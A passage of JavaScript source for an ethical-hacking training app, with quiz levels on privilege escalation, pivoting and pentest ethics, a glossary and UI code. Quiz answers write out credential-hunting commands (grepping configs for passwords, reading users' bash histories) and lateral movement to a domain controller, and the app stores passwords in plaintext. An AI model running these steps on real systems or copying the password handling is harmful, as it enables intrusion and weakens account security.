      {type:"scenario",situation:"You found: SUID python3, writable cron script, and an old kernel. Which is safest to exploit?",q:"Best escalation path?",opts:["SUID python3 \u2014 reliable and instant","Kernel exploit \u2014 might crash the system","Writable cron \u2014 have to wait for it to run","All three at once"],a:"SUID python3 \u2014 reliable and instant",why:"SUID exploitation is instant, reliable, and won't crash anything. Kernel exploits are risky."},
      {type:"type",q:"Use Metasploit's search to find an exploit:",a:["search eternalblue","search type:exploit wordpress","search cve:2024"],why:"Metasploit's search finds modules by name, CVE, or type."},
      {type:"pick",q:"Meterpreter's getsystem attempts to:",opts:["Escalate to SYSTEM/root privileges","Download system files","Get system information","Connect to another system"],a:"Escalate to SYSTEM/root privileges",why:"getsystem tries multiple techniques to escalate from user to SYSTEM."}
    ]},
    {id:"m4t3",title:"\uD83E\uDD47 Exploit Test 3",isMasters:true,rounds:[
      {type:"build",q:"Build an SSH tunnel to reach an internal web server:",parts:["ssh","-L","8080:10.0.0.5:80","user@pivot"],answer:["ssh","-L","8080:10.0.0.5:80","user@pivot"],why:"Local port forward through a compromised pivot host."},
      {type:"pick",q:"After compromising a server, first priority:",opts:["Enumerate users, SUID, creds, network","Delete logs","Kernel exploit immediately","Scan the whole internet"],a:"Enumerate users, SUID, creds, network",why:"Methodical enumeration finds the safest escalation path."},
      {type:"type",q:"Search config files for hardcoded passwords:",a:["grep -ri 'password' /etc/ /var/www/ /opt/","grep -ri 'pass' /etc/ /var/www/"],why:"Config files are the #1 source of credentials on compromised boxes."},
      {type:"type",q:"Check bash history for leaked secrets:",a:["cat ~/.bash_history","cat /home/*/.bash_history"],why:"Users type passwords in commands: mysql -pPassword, curl with API keys."},
      {type:"pick",q:"Lateral movement via SSH key reuse works because:",opts:["Same SSH key often unlocks multiple servers","SSH keys are easy to crack","SSH has known vulnerabilities","Keys expire quickly"],a:"Same SSH key often unlocks multiple servers",why:"Admins reuse keys. Found key + known_hosts = access to more machines."},
      {type:"scenario",situation:"You have root on a DMZ server and found domain admin credentials in a config file. Internal DC is at 10.0.0.5.",q:"Final step?",opts:["psexec/wmiexec to the domain controller","Scan every internal host first","Set up a persistent backdoor","Email the admin their password"],a:"psexec/wmiexec to the domain controller",why:"DA creds + psexec = shell on the DC. Complete network compromise."}
    ]}
  ]}
]};

var SEC16 = {
  id:"s16",title:"Masters: Methodology & Ethics",tier:"masters",icon:"\uD83C\uDFC6",color:"var(--gold)",
  units:[
  {id:"m5",title:"Final Certification",desc:"Ethics, methodology, and real-world readiness",levels:[
    {id:"m5t1",title:"\uD83E\uDD47 Methodology Test 1",isMasters:true,rounds:[
      {type:"order",q:"Order the 5 phases of ethical hacking:",items:["Reconnaissance","Scanning & Enumeration","Exploitation","Post-Exploitation","Reporting"],why:"Every engagement follows this methodology. Skipping phases leads to missed findings."},
      {type:"pick",q:"You find a critical vulnerability. What do you do FIRST?",opts:["Document it and verify in scope","Exploit it fully to show impact","Tell your friend about it","Post it on social media"],a:"Document it and verify in scope",why:"Always verify the target is in scope. Exploiting out-of-scope targets is illegal."},
      {type:"pick",q:"Penetration testing without written authorization is:",opts:["Always illegal","Legal if you find bugs","Legal on weekends","Legal if the target is a big company"],a:"Always illegal",why:"Written permission (scope document) is required. Without it, it's a crime."},
      {type:"pick",q:"A white hat hacker is:",opts:["An authorized security tester","A criminal hacker","Someone who uses tools without understanding","An anonymous activist"],a:"An authorized security tester",why:"White hats have written permission and work within legal boundaries."},
      {type:"scenario",situation:"During a pentest you accidentally access a database with real customer credit card numbers.",q:"Correct action?",opts:["Stop, document the access path, report to client immediately","Download the data as proof","Tell the customers their data is exposed","Keep testing other systems"],a:"Stop, document the access path, report to client immediately",why:"Sensitive data access must be reported immediately. Never download or view more than needed."},
      {type:"pick",q:"CVSS score for unauthenticated RCE on a public server:",opts:["Critical (9.0+)","High (7.0-8.9)","Medium (4.0-6.9)","Low (0.1-3.9)"],a:"Critical (9.0+)",why:"Unauthenticated Remote Code Execution on a public server is always critical."}
    ]},
    {id:"m5t2",title:"\uD83E\uDD47 Methodology Test 2",isMasters:true,rounds:[
      {type:"order",q:"Order a vulnerability report:",items:["Title & Severity","Description","Steps to reproduce","Evidence & proof","Impact statement","Remediation"],why:"Structured reports communicate findings clearly and get bugs fixed."},
      {type:"match",q:"Match the vulnerability to its severity:",pairs:[["Unauthenticated RCE","Critical"],["Reflected XSS","Medium"],["Missing HTTP header","Low"],["SQLi with data access","High"]],why:"Severity depends on exploitability and impact."},
      {type:"pick",q:"A 4-digit MFA code without rate limiting has:",opts:["10,000 possible combinations, trivially brute-forceable","Infinite combinations","Only 100 combinations","1 million combinations"],a:"10,000 possible combinations, trivially brute-forceable",why:"0000-9999 = 10,000 combos. Without rate limiting, takes minutes."},
      {type:"pick",q:"Credential stuffing uses:",opts:["Leaked username:password pairs from breaches","Random password guesses","Only one password per account","Social engineering"],a:"Leaked username:password pairs from breaches",why:"People reuse passwords. Breached combo lists are tested on other services."},
      {type:"pick",q:"After a pentest, who should receive the report?",opts:["The client's designated security contact","Everyone at the company","The public","Your social media followers"],a:"The client's designated security contact",why:"Reports contain sensitive exploit details. Only the authorized contact should receive them."},
      {type:"pick",q:"Bug bounty scope says *.target.com EXCEPT mail.target.com. You find a vuln on mail.target.com. You should:",opts:["Do NOT test further, it's out of scope","Exploit it anyway since it's a subdomain","Report it with full details","Tell other researchers about it"],a:"Do NOT test further, it's out of scope",why:"Out of scope means do not touch. Testing it could be illegal."}
    ]},
    {id:"m5t3",title:"\uD83C\uDFC6 Final Certification",isMasters:true,isCheckpoint:true,rounds:[
      {type:"pick",q:"The most important tool in ethical hacking is:",opts:["Methodology and critical thinking","Metasploit","Kali Linux","A fast computer"],a:"Methodology and critical thinking",why:"Tools change. Thinking methodically, understanding systems, and being ethical never goes out of style."},
      {type:"scenario",situation:"You've completed the full HackPath curriculum. A friend asks you to 'hack their ex's Instagram.'",q:"Your response?",opts:["Refuse \u2014 that's unauthorized access, it's illegal","Do it as a favor","Do it but charge money","Show them how but don't do it yourself"],a:"Refuse \u2014 that's unauthorized access, it's illegal",why:"Hacking without authorization is a crime regardless of the reason. Ethics first."},
      {type:"scenario",situation:"You're offered $5000 to find vulnerabilities in a company. They give you a signed contract with clear scope.",q:"Is this ethical?",opts:["Yes \u2014 authorized pentest with written scope","No \u2014 all hacking is illegal","Only if you work for a security company","Only if you use approved tools"],a:"Yes \u2014 authorized pentest with written scope",why:"Written authorization + clear scope = legal and ethical penetration testing."},
      {type:"order",q:"Final order \u2014 the complete attack chain:",items:["OSINT & passive recon","Active scanning & enumeration","Initial exploitation","Privilege escalation","Lateral movement & pivoting","Data exfiltration & reporting"],why:"This is the full methodology from first recon to final report. You've mastered it all."},
      {type:"pick",q:"What separates a pentester from a criminal?",opts:["Written authorization and ethical boundaries","Technical skill level","The tools they use","How fast they hack"],a:"Written authorization and ethical boundaries",why:"Permission and ethics. Same skills, completely different intent and legality."},
      {type:"pick",q:"You've completed HackPath. What's next?",opts:["Practice on legal platforms (HackTheBox, TryHackMe) and pursue certifications","Start hacking random websites","Sell exploits on the dark web","Nothing, you're done learning"],a:"Practice on legal platforms (HackTheBox, TryHackMe) and pursue certifications",why:"Real skill comes from practice. HTB, THM, OSCP, and bug bounties are your next steps."}
    ]}
  ]}
]};


var SECTIONS = [SEC1, SEC2, SEC3, SEC4, SEC5, SEC6, SEC7, SEC8, SEC9, SEC10, SEC11, SEC12, SEC13, SEC14, SEC15, SEC16];
var ALL_UNITS = [];
var ALL_LEVELS = [];
var PATH = [];

SECTIONS.forEach(function(sec){
  sec.units.forEach(function(unit){
    unit.sectionId = sec.id;
    unit.sectionTitle = sec.title;
    unit.tier = sec.tier;
    ALL_UNITS.push(unit);
    unit.levels.forEach(function(lev){
      lev.unitId = unit.id;
      lev.unitTitle = unit.title;
      lev.sectionId = sec.id;
      lev.tier = sec.tier;
      ALL_LEVELS.push(lev);
      PATH.push(lev.id);
    });
  });
});

// === MODAL ===
function showConfirm(title,msg,onYes){
  var overlay=document.createElement('div');
  overlay.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.65);z-index:1000;display:flex;align-items:center;justify-content:center;padding:20px;animation:fadeIn .2s ease';
  var box=document.createElement('div');box.className='card popIn';
  box.style.cssText='max-width:340px;width:100%;text-align:center;display:flex;flex-direction:column;gap:14px';
  box.innerHTML='<div style="font-size:1.05rem;font-weight:700">'+title+'</div><div style="font-size:.85rem;color:var(--text2)">'+msg+'</div>';
  var btns=document.createElement('div');btns.style.cssText='display:flex;gap:8px';
  var no=document.createElement('button');no.className='btn sec';no.style.flex='1';no.textContent='Cancel';
  no.onclick=function(){overlay.remove()};
  var yes=document.createElement('button');yes.className='btn';yes.style.cssText='flex:1;background:var(--red);color:white';
  yes.textContent='Confirm';yes.onclick=function(){overlay.remove();if(onYes)onYes()};
  btns.appendChild(no);btns.appendChild(yes);box.appendChild(btns);
  overlay.appendChild(box);document.body.appendChild(overlay);
  overlay.onclick=function(e){if(e.target===overlay)overlay.remove()};
}

// === GLOSSARY ===
var GLOSS={
  "port":"A numbered door on a computer (0-65535). Each service uses a specific port \u2014 like apartment numbers in a building.",
  "ip address":"A computer's address on a network, like a street address. Example: 192.168.1.1",
  "ip":"A computer's address on a network, like a street address. Example: 192.168.1.1",
  "hash":"A one-way scramble of a password. You can't reverse it, but you can compare it to known hashes.",
  "suid":"A special permission on Linux files that makes them run as the file's owner (usually root) instead of you.",
  "root":"The all-powerful admin account on Linux. Getting root = having complete control.",
  "shell":"A text-based interface to control a computer. Think of it as a conversation with the machine.",
  "reverse shell":"A connection where the TARGET computer calls back to YOUR computer, giving you remote control.",
  "payload":"The code you deliver after exploiting a vulnerability \u2014 like the spy you sneak in after kicking the door down.",
  "exploit":"A piece of code that takes advantage of a vulnerability to do something unintended.",
  "vulnerability":"A weakness or flaw in software that can be exploited.",
  "nmap":"The #1 network scanning tool. Finds open ports, services, and operating systems.",
  "sql injection":"Tricking a database by putting commands into input fields like login forms.",
  "xss":"Cross-Site Scripting \u2014 injecting code into a website that runs in other users' browsers.",
  "brute force":"Trying every possible password until one works.",
  "dns":"Domain Name System \u2014 translates domain names (google.com) into IP addresses.",
  "tcp":"A reliable network protocol that guarantees data arrives in order (like a phone call).",
  "udp":"A fast but unreliable protocol with no delivery guarantee (like shouting across a room).",
  "ssh":"Secure Shell \u2014 encrypted remote access to another computer's terminal. Port 22.",
  "http":"The protocol browsers use to load websites. Port 80 (or 443 for HTTPS).",
  "subnet":"A subdivision of a network. /24 = 256 addresses, /25 = 128, etc.",
  "privilege escalation":"Going from a regular user to root/admin \u2014 like promoting yourself from janitor to king.",
  "privesc":"Going from a regular user to root/admin \u2014 like promoting yourself from janitor to king.",
  "osint":"Open Source Intelligence \u2014 gathering info from public sources like Google and social media.",
  "burp suite":"A tool that intercepts and modifies web traffic between your browser and a website.",
  "metasploit":"A framework (weapon vault) containing thousands of exploits and payloads.",
  "meterpreter":"Metasploit's advanced payload \u2014 gives you file access, screenshots, keylogging, and more on a hacked machine.",
  "ctf":"Capture The Flag \u2014 hacking competitions where you solve challenges to find hidden flags.",
  "cve":"Common Vulnerabilities and Exposures \u2014 a database of known security flaws, each with a unique ID.",
  "wordlist":"A file containing thousands/millions of words to try when cracking passwords.",
  "enumeration":"Systematically gathering information about a target \u2014 users, services, shares, etc.",
  "pivoting":"Using a hacked machine as a stepping stone to reach other machines on internal networks.",
  "scope":"The agreed-upon list of what you're allowed to test. Going outside scope = illegal.",
  "nda":"Non-Disclosure Agreement \u2014 a contract saying you'll keep all findings secret.",
  "firewall":"A security system that monitors and controls network traffic based on rules.",
  "ids":"Intrusion Detection System \u2014 watches network traffic for suspicious activity.",
  "api":"Application Programming Interface \u2014 how software communicates with other software.",
  "jwt":"JSON Web Token \u2014 a compact token used for authentication, made of header.payload.signature.",
  "ssrf":"Server-Side Request Forgery \u2014 tricking a server into making requests to internal resources."
};
function getGlossaryTerms(text){
  var found=[],low=text.toLowerCase();
  var keys=Object.keys(GLOSS).sort(function(a,b){return b.length-a.length});
  for(var i=0;i<keys.length;i++){
    var k=keys[i];
    if(low.indexOf(k)!==-1 && found.length<3){
      var dup=false;for(var j=0;j<found.length;j++)if(found[j].term===k)dup=true;
      if(!dup)found.push({term:k,def:GLOSS[k]});
    }
  }
  return found;
}
function makeGlossaryEl(terms){
  if(!terms.length)return null;
  var d=document.createElement('div');d.style.cssText='margin-top:8px';
  terms.forEach(function(t){
    var row=document.createElement('div');row.style.cssText='font-size:.75rem;color:var(--textDim);padding:6px 10px;background:var(--bg2);border-radius:6px;margin-top:4px;line-height:1.4';
    row.innerHTML='<strong style="color:var(--cyan);text-transform:capitalize">'+esc(t.term)+':</strong> '+esc(t.def);
    d.appendChild(row);
  });
  return d;
}

// === APP STATE ===
var S={screen:'auth',user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:'dark',volume:80,sfx:true,haptics:true}};
var root=document.getElementById('root');

function render(){
  document.onkeydown=null;
  root.innerHTML='';window.scrollTo({top:0,behavior:'instant'});
  if(S.screen==='auth')renderAuth();
  else if(S.screen==='os')renderOS();
  else if(S.screen==='map'){renderMap();renderNav('map')}
  else if(S.screen==='lesson')renderLesson();
  else if(S.screen==='result')renderResult();
  else if(S.screen==='settings'){renderSettings();renderNav('settings')}
  // Fade in
  if(root.firstChild)root.firstChild.classList.add('screen-fade');
}

function getNext(){for(var i=0;i<PATH.length;i++)if(!S.progress[PATH[i]]||!S.progress[PATH[i]].passed)return PATH[i];return null}
function getXP(){var t=0;for(var k in S.progress)if(S.progress[k].xp)t+=S.progress[k].xp;return t}

function renderNav(active){
  var nav=document.createElement('div');nav.className='bnav';
  var tabs=[{id:'map',ico:'\uD83D\uDDFA\uFE0F',label:'Learn'},{id:'settings',ico:'\u2699\uFE0F',label:'Settings'}];
  tabs.forEach(function(t){
    var b=document.createElement('button');b.className='bnav-btn'+(active===t.id?' active':'');
    b.innerHTML='<span class="ico">'+t.ico+'</span>'+t.label;
    b.onclick=function(){SFX.tap();S.screen=t.id;render()};
    nav.appendChild(b);
  });
  root.appendChild(nav);
}

// === AUTH ===
function renderAuth(){
  var mode='register';
  function draw(){
    root.innerHTML='';
    var w=document.createElement('div');w.className='center';
    w.innerHTML='<div style="text-align:center"><div style="font-size:2.5rem;font-family:JetBrains Mono,monospace;font-weight:800"><span style="background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">&gt;_HackPath</span></div><div style="color:var(--textDim);margin-top:8px;font-size:.9rem">Learn ethical hacking from zero to bug bounty</div></div>';
    var c=document.createElement('div');c.className='card gap';c.style.width='100%';
    var tabs=document.createElement('div');tabs.style.cssText='display:flex;gap:8px';
    var br=document.createElement('button');br.className='btn sm '+(mode==='register'?'':'sec');br.textContent='Register';br.onclick=function(){mode='register';draw()};
    var bl=document.createElement('button');bl.className='btn sm '+(mode==='login'?'':'sec');bl.textContent='Login';bl.onclick=function(){mode='login';draw()};
    tabs.appendChild(br);tabs.appendChild(bl);
    var iu=document.createElement('input');iu.className='inp';iu.placeholder=mode==='register'?'Choose a username':'Username';iu.autocomplete='username';
    var ip=document.createElement('input');ip.className='inp';ip.type='password';ip.placeholder=mode==='register'?'Choose a password':'Password';
    var err=document.createElement('div');err.style.cssText='color:var(--red);font-size:.82rem;min-height:20px';
    var sub=document.createElement('button');sub.className='btn full';sub.textContent=mode==='login'?'Login':'Create Account';
    sub.onclick=function(){
      var u=iu.value.trim(),p=ip.value;
      if(!u||!p){err.textContent='Fill in both fields';return}
      if(mode==='register'){
        var ne=checkUName(u);if(ne){err.textContent=ne;return}
        if(p.length<3){err.textContent='Password needs 3+ characters';return}
        if(checkUser(u)){err.textContent='Username taken';return}
        saveUser(u,p);doLogin(u);
      }else{
        var st=checkUser(u);if(!st||st!==p){err.textContent='Wrong username or password';return}
        doLogin(u);
      }
    };
    iu.onkeydown=ip.onkeydown=function(e){if(e.key==='Enter')sub.click()};
    var saveNote=document.createElement('div');saveNote.style.cssText='font-size:.75rem;color:var(--green);text-align:center';
    saveNote.textContent='\u2705 Progress is saved with an account';
    c.appendChild(tabs);c.appendChild(iu);c.appendChild(ip);c.appendChild(err);c.appendChild(sub);c.appendChild(saveNote);
    var skip=document.createElement('button');skip.className='btn sec full';skip.style.cssText='opacity:.45;margin-top:4px';skip.textContent='Continue as Guest';skip.onclick=function(){doLogin('guest')};
    var gw=document.createElement('div');gw.style.cssText='font-size:.7rem;color:var(--textDim);text-align:center';
    gw.textContent='\u26A0\uFE0F Guest mode does not save progress';
    w.appendChild(c);w.appendChild(skip);w.appendChild(gw);root.appendChild(w);iu.focus();
  }
  draw();
}

function doLogin(u){
  S.user=u;S.progress=loadP(u);S.userOS=loadOS(u);
  var sets=loadSets(u);
  S.settings={theme:sets.theme||'dark',volume:sets.volume!==undefined?sets.volume:80,sfx:sets.sfx!==undefined?sets.sfx:true,haptics:sets.haptics!==undefined?sets.haptics:true};
  _vol=S.settings.volume;_sfxOn=S.settings.sfx;
  applyTheme(S.settings.theme);
  S.screen=S.userOS?'map':'os';render();
}

// === OS PICKER ===
function renderOS(){
  var sel=S.userOS?S.userOS.slice():[];
  var oses=[{id:'mobile',icon:'\uD83D\uDCF1',name:'Mobile / Any Device',desc:'No terminal needed'},{id:'linux',icon:'\uD83D\uDC27',name:'Linux / Kali',desc:'Recommended for hacking'},{id:'windows',icon:'\uD83E\uDE9F',name:'Windows',desc:'PowerShell & WSL'},{id:'mac',icon:'\uD83C\uDF4E',name:'macOS',desc:'Unix-based terminal'}];
  function draw(){
    root.innerHTML='';
    var w=document.createElement('div');w.className='center';
    w.innerHTML='<div style="text-align:center"><div style="font-size:1.3rem;font-weight:700">How are you learning?</div><div style="color:var(--textDim);font-size:.85rem;margin-top:4px">Pick your device. This customizes commands shown in lessons.</div></div>';
    var list=document.createElement('div');list.className='gap';list.style.width='100%';
    oses.forEach(function(o){
      var b=document.createElement('div');b.className='osbtn'+(sel.indexOf(o.id)!==-1?' sel':'');
      b.innerHTML='<div style="font-size:1.5rem">'+o.icon+'</div><div style="font-weight:600;margin-top:4px">'+o.name+'</div><div style="font-size:.72rem;color:var(--textDim);margin-top:2px">'+o.desc+'</div>';
      b.onclick=function(){SFX.tap();var i=sel.indexOf(o.id);if(i===-1)sel.push(o.id);else sel.splice(i,1);draw()};
      list.appendChild(b);
    });
    var go=document.createElement('button');go.className='btn full';go.disabled=!sel.length;go.textContent='Continue';
    go.onclick=function(){S.userOS=sel;saveOS(S.user,sel);S.screen='map';render()};
    w.appendChild(list);w.appendChild(go);root.appendChild(w);
  }
  draw();
}

// === SETTINGS ===
function renderSettings(){
  var w=document.createElement('div');w.className='hp fadeIn';

  // Header
  var hdr=document.createElement('div');hdr.className='hdr';
  hdr.innerHTML='<span class="logo">&gt;_Settings</span>';
  var xp=document.createElement('span');xp.className='badge badge-xp';xp.textContent='\u26A1 '+getXP()+' XP';
  hdr.appendChild(xp);w.appendChild(hdr);

  // Profile
  var g1=document.createElement('div');g1.className='set-group';
  g1.innerHTML='<div class="set-label">Profile</div>';
  var r1=document.createElement('div');r1.className='set-row';
  var isGuest=S.user==='guest';
  r1.innerHTML='<div class="left"><div class="icon">\uD83D\uDC64</div><div><div class="label">'+(isGuest?'Guest':esc(S.user))+'</div><div class="sublabel">'+(isGuest?'\u26A0\uFE0F Progress not saved':'Logged in')+'</div></div></div>';
  g1.appendChild(r1);
  if(isGuest){var cab=document.createElement('button');cab.className='btn full';cab.style.marginTop='4px';cab.textContent='Create Account to Save Progress';cab.onclick=function(){S={screen:'auth',user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:'dark',volume:80,sfx:true,haptics:true}};applyTheme('dark');render()};g1.appendChild(cab)}
  w.appendChild(g1);

  // Appearance
  var g2=document.createElement('div');g2.className='set-group';
  g2.innerHTML='<div class="set-label">Appearance</div>';
  var tg=document.createElement('div');tg.className='theme-grid';
  Object.keys(THEMES).forEach(function(tid){
    var th=THEMES[tid];
    var d=document.createElement('div');d.className='theme-opt'+(S.settings.theme===tid?' sel':'');
    d.innerHTML='<div class="theme-dot" style="background:'+th.dot+';border-color:'+th.border+'"></div><div style="font-size:.82rem;font-weight:600">'+th.name+'</div>';
    d.onclick=function(){SFX.tap();S.settings.theme=tid;applyTheme(tid);saveSets(S.user,S.settings);render()};
    tg.appendChild(d);
  });
  g2.appendChild(tg);w.appendChild(g2);

  // Sound
  var g3=document.createElement('div');g3.className='set-group';
  g3.innerHTML='<div class="set-label">Sound</div>';

  var sfxRow=document.createElement('div');sfxRow.className='set-row hoverable';
  sfxRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDD0A</div><div class="label">Sound Effects</div></div>';
  var tog=document.createElement('div');tog.className='toggle'+(S.settings.sfx?' on':'');
  tog.onclick=function(){S.settings.sfx=!S.settings.sfx;_sfxOn=S.settings.sfx;saveSets(S.user,S.settings);render()};
  sfxRow.appendChild(tog);g3.appendChild(sfxRow);

  var volRow=document.createElement('div');volRow.className='slider-wrap';
  volRow.innerHTML='<span style="font-size:1rem">\uD83D\uDD09</span>';
  var sl=document.createElement('input');sl.type='range';sl.min='0';sl.max='100';sl.value=String(S.settings.volume);
  var vlbl=document.createElement('span');vlbl.className='slider-val';vlbl.textContent=S.settings.volume+'%';
  sl.oninput=function(){S.settings.volume=parseInt(sl.value);_vol=S.settings.volume;vlbl.textContent=S.settings.volume+'%'};
  sl.onchange=function(){saveSets(S.user,S.settings);SFX.tap()};
  volRow.appendChild(sl);volRow.appendChild(vlbl);g3.appendChild(volRow);
  w.appendChild(g3);

  // Device
  var g4=document.createElement('div');g4.className='set-group';
  g4.innerHTML='<div class="set-label">Device</div>';
  var devRow=document.createElement('div');devRow.className='set-row hoverable hover-blue';
  var osText=S.userOS?S.userOS.join(', '):'Not set';
  devRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDCBB</div><div><div class="label">Learning Device</div><div class="sublabel">'+esc(osText)+'</div></div></div><span style="color:var(--textDim)">\u276F</span>';
  devRow.onclick=function(){SFX.tap();S.screen='os';render()};
  g4.appendChild(devRow);w.appendChild(g4);

  // Data
  var g5=document.createElement('div');g5.className='set-group';
  g5.innerHTML='<div class="set-label">Data</div>';

  var done=0;PATH.forEach(function(id){if(S.progress[id]&&S.progress[id].passed)done++});
  var statRow=document.createElement('div');statRow.className='set-row';
  statRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDCCA</div><div><div class="label">Progress</div><div class="sublabel">'+done+'/'+PATH.length+' levels \u2022 '+getXP()+' XP</div></div></div>';
  g5.appendChild(statRow);

  var resetRow=document.createElement('div');resetRow.className='set-row hover-red';
  resetRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDDD1\uFE0F</div><div><div class="label" style="color:var(--red)">Reset Progress</div><div class="sublabel">Start over from scratch</div></div></div><span style="color:var(--textDim)">\u276F</span>';
  resetRow.onclick=function(){showConfirm('Reset all progress?','This cannot be undone. You will lose all XP and level completions.',function(){S.progress={};saveP(S.user,{});SFX.tap();render()})};
  g5.appendChild(resetRow);w.appendChild(g5);

  // Logout
  var lo=document.createElement('button');lo.className='btn danger full';lo.style.marginTop='8px';
  lo.textContent='Logout';lo.onclick=function(){S={screen:'auth',user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:'dark',volume:80,sfx:true,haptics:true}};applyTheme('dark');render()};
  w.appendChild(lo);

  var ver=document.createElement('div');ver.style.cssText='text-align:center;padding:20px 0;font-size:.7rem;color:var(--textDim)';
  ver.textContent='HackPath v12 \u2022 Learn Ethical Hacking';w.appendChild(ver);

  root.appendChild(w);
}

// === MAP ===
function renderMap(){
  var next=getNext(),xp=getXP();
  var done=0;PATH.forEach(function(id){if(S.progress[id]&&S.progress[id].passed)done++});
  var pct=Math.round(done/PATH.length*100);
  var w=document.createElement('div');w.className='hp fadeIn';

  // Header
  var hdr=document.createElement('div');hdr.className='hdr';
  var h1=document.createElement('span');h1.className='logo';h1.textContent='>_HackPath';hdr.appendChild(h1);
  var hr=document.createElement('div');hr.className='hdr-r';
  hr.innerHTML='<span class="badge badge-xp">\u26A1 '+xp+' XP</span>';
  hdr.appendChild(hr);w.appendChild(hdr);

  // Overall progress with percentage
  var pp=document.createElement('div');pp.style.cssText='display:flex;justify-content:space-between;align-items:center;font-size:.72rem;color:var(--textDim);margin-bottom:2px';
  pp.innerHTML='<span>'+done+' of '+PATH.length+' complete</span><span style="font-weight:700;color:var(--green)">'+pct+'%</span>';w.appendChild(pp);
  var pb=document.createElement('div');pb.className='map-progress';
  pb.innerHTML='<div class="map-progress-bar" style="width:'+pct+'%"></div>';w.appendChild(pb);

  // Continue button
  if(next){
    var cb=document.createElement('button');cb.className='btn full';cb.style.cssText='margin:12px 0 20px;font-size:.95rem;padding:13px';
    cb.textContent='\u25B6  Continue Learning';cb.onclick=function(){SFX.tap();startLesson(next)};w.appendChild(cb);
  }else if(done===PATH.length){
    var cd=document.createElement('div');cd.className='card';cd.style.cssText='text-align:center;margin-bottom:20px;background:linear-gradient(135deg,rgba(52,211,153,.15),rgba(34,211,238,.1));border-color:var(--green)';
    cd.innerHTML='<div style="font-size:1.4rem;font-weight:800">\uD83C\uDF93 Course Complete!</div><div style="font-size:.85rem;color:var(--text2);margin-top:6px">You finished all '+PATH.length+' levels. Go find some real bugs!</div>';
    w.appendChild(cd);
  }

  // Sections
  SECTIONS.forEach(function(sec){
    var secDone=0,secTotal=0;
    sec.units.forEach(function(u){u.levels.forEach(function(l){secTotal++;if(S.progress[l.id]&&S.progress[l.id].passed)secDone++})});
    var secPct=secTotal?Math.round(secDone/secTotal*100):0;

    var tierColors={basic:'var(--green)',intermediate:'var(--blue)',advanced:'var(--purple)',masters:'var(--gold)'};
    var tierLabels={basic:'BASIC',intermediate:'INTERMEDIATE',advanced:'ADVANCED',masters:'MASTERS'};

    var sh=document.createElement('div');sh.className='sec-hdr';
    sh.innerHTML='<div class="sec-icon" style="background:'+(tierColors[sec.tier]||'var(--green)')+';color:#fff">'+sec.icon+'</div><div class="sec-info"><div class="sec-title">'+esc(sec.title)+'</div><div class="sec-desc" style="color:'+(tierColors[sec.tier]||'var(--textDim)')+'">'+tierLabels[sec.tier]+' \u2022 '+secDone+'/'+secTotal+'</div></div><div style="font-size:.7rem;color:var(--textDim);font-family:JetBrains Mono,monospace">'+secPct+'%</div>';
    w.appendChild(sh);
    var spb=document.createElement('div');spb.className='pbar';spb.style.marginBottom='12px';
    var fc=sec.tier==='advanced'||sec.tier==='masters'?'pfill-b':'pfill-g';
    spb.innerHTML='<div class="pfill '+fc+'" style="width:'+secPct+'%"></div>';w.appendChild(spb);

    sec.units.forEach(function(unit){
      var uDone=true,uStarted=false;
      unit.levels.forEach(function(l){if(!S.progress[l.id]||!S.progress[l.id].passed)uDone=false;if(S.progress[l.id]&&S.progress[l.id].passed)uStarted=true});
      var ulab=document.createElement('div');ulab.style.cssText='font-size:.78rem;color:var(--textDim);margin:16px 0 6px;font-weight:600';
      ulab.textContent=(uDone?'\u2705':uStarted?'\uD83D\uDD36':'\uD83D\uDD12')+' '+unit.title;
      w.appendChild(ulab);
      var row=document.createElement('div');row.style.cssText='display:flex;flex-wrap:wrap;gap:8px;margin-bottom:4px;padding-left:4px';
      unit.levels.forEach(function(lev,li){
        var pi=PATH.indexOf(lev.id);
        var unlocked=pi===0||(S.progress[PATH[pi-1]]&&S.progress[PATH[pi-1]].passed);
        var isDone=S.progress[lev.id]&&S.progress[lev.id].passed;
        var isCur=lev.id===next;
        var isCP=lev.isCheckpoint;
        var isLab=lev.id.indexOf('lab')!==-1;
        var stars=(S.progress[lev.id]&&S.progress[lev.id].stars)||0;
        var col=document.createElement('div');col.style.cssText='display:flex;flex-direction:column;align-items:center;gap:2px';
        var nd=document.createElement('div');nd.className='mnode '+(isCP?'cp ':isLab?'lab ':'')+(isDone?'done':isCur||unlocked?'cur':'lock');
        var nodeLabel=isDone?'\u2713':isCP?(unlocked?'\uD83C\uDFC6':'\uD83D\uDD12'):isLab?(unlocked?'\uD83D\uDDA5\uFE0F':'\uD83D\uDD12'):!unlocked?'\uD83D\uDD12':String(li+1);
        nd.innerHTML=nodeLabel+'<span class="tip">'+esc(lev.title.replace(/^\uD83D\uDDA5\uFE0F |\uD83C\uDFC6 /g,''))+'</span>';
        if(unlocked)nd.onclick=(function(id){return function(){SFX.tap();startLesson(id)}})(lev.id);
        col.appendChild(nd);
        if(isDone&&stars>0){var st=document.createElement('div');st.style.fontSize='.55rem';st.textContent='\u2B50'.repeat(stars);col.appendChild(st)}
        row.appendChild(col);
      });
      w.appendChild(row);
    });
  });
  w.appendChild(document.createElement('div')).style.height='40px';
  root.appendChild(w);
}

// === LESSON ENGINE ===
// === WEAK QUESTION TRACKING ===
function saveWeak(user,missed){
  if(user==='guest'||!missed||!missed.length)return;
  try{
    var key=sKey(user,'weak');
    var existing=JSON.parse(localStorage.getItem(key)||'[]');
    missed.forEach(function(r){
      // Store simplified version: type + question + answer
      existing.push({type:r.type,q:r.q||'',a:r.a,opts:r.opts,pairs:r.pairs,items:r.items,parts:r.parts,answer:r.answer,why:r.why});
    });
    // Keep only last 30 weak questions
    if(existing.length>30)existing=existing.slice(-30);
    localStorage.setItem(key,JSON.stringify(existing));
  }catch(e){}
}
function getWeakQuestions(levelId){
  if(!S.user||S.user==='guest')return[];
  try{
    var weak=JSON.parse(localStorage.getItem(sKey(S.user,'weak'))||'[]');
    if(!weak.length)return[];
    // Pick up to 2 random weak questions to inject
    var shuffled=weak.sort(function(){return Math.random()-.5});
    var picked=shuffled.slice(0,2);
    // Remove picked from storage so they don't repeat forever
